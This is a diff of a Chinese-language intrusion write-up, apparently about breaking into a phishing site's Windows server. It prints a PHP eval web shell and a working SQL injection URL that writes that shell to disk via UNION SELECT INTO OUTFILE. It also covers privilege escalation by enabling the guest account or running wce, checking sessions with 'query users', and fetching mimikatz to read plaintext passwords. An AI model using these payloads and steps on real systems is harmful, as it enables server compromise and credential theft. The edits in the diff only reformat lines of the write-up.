@@ -89,16 +89,17 @@ php一句话<?php eval($_POST['test'])?>
 去https://www.107000.com/T-Hex/ 转成hex16进制加上0x
 得出写入webhsell语句.
 
->http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,0x3C3F706870206576616C28245F504F53545B2774657374275D293F3E,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 into outfile 'D:/xxxxx/zz/weiho.php'
+>http://www.xxxxx.cn/zz/index.php?zt=1&uid=87 xor 1=2 union select 1,2,3,4,0x3C3F706870206576616C28245F504F53545B2774657374275D293F3E,6,7,8,9,10,11,12,13,
+>14,15,16,17,18,19,20,21,22,23,24,25,26 into outfile 'D:/xxxxx/zz/weiho.php'
 
 
 ### 1.8 提升权限
 
 ![avatar](https://weiho-1252873266.cos.ap-guangzhou.myqcloud.com/blog/1Traceability/Gofishing/20180714150838.png)
 连接上去看一下权限,Administrator..典型phpstudy安装完啥也不管直接把站丢上去的情况..还想着要不Mysql UDF或者MOF提权.这里接下来有两种做法,直接启用guest,添加密码以及管理员权限.第二种下个wce读取明文,以administrator的权限登陆.Ps:wce需要管理员或管理员以上的权限才可以,一般情况下配合本地提权exploit,但这里是Administrator.可以忽略掉要提权的操作.不过我们这里选前者,直接启用guest账号.先查看下对方在不在VPS里.状态:断开.
+
 >query users //查看登陆
->
->用户名                会话名             ID  状态    空闲时间   登录时间
+用户名                会话名             ID  状态    空闲时间   登录时间
 >
 >administrator                             2  断开      1+21:09  2018/7/11 23:15
 >
@@ -117,7 +118,8 @@ php一句话<?php eval($_POST['test'])?>
 
 ### 1.10 读取明文密码
 
-https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20180616
+[mimikatz](https://github.com/gentilkiwi/mimikatz/releases/tag/2.1.1-20180616)
+
 先下载回来,由于这VPS是x86系统所以运行x86的mimikatz
 
 Ps:一定要是管理员权限才能运行.
